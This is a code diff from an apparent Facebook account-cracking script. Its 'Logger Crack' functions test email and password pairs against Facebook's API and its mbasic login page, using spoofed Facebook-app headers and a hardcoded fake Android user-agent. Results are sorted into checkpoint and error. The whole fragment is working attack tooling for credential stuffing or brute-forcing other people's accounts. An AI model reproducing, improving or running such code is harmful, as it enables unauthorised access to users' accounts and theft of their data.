@@ -324,7 +324,7 @@ def _pass_list_(_cici_):
 
 ### Logger Crack
 def log_api(em,pas,hosts):
-    ua = open('ugent.txt','r').read()
+    ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
     r = requests.Session()
     header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
         "x-fb-sim-hni": str(random.randint(20000, 40000)),
@@ -351,7 +351,7 @@ def log_api(em,pas,hosts):
         return {"status":"cp","email":em,"pass":pas}
     else:return {"status":"error","email":em,"pass":pas}
 def log_mbasic(em,pas,hosts):
-    ua = open('ugent.txt','r').read()
+    ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
     r = requests.Session()
     r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
     p = r.get("https://mbasic.facebook.com/")
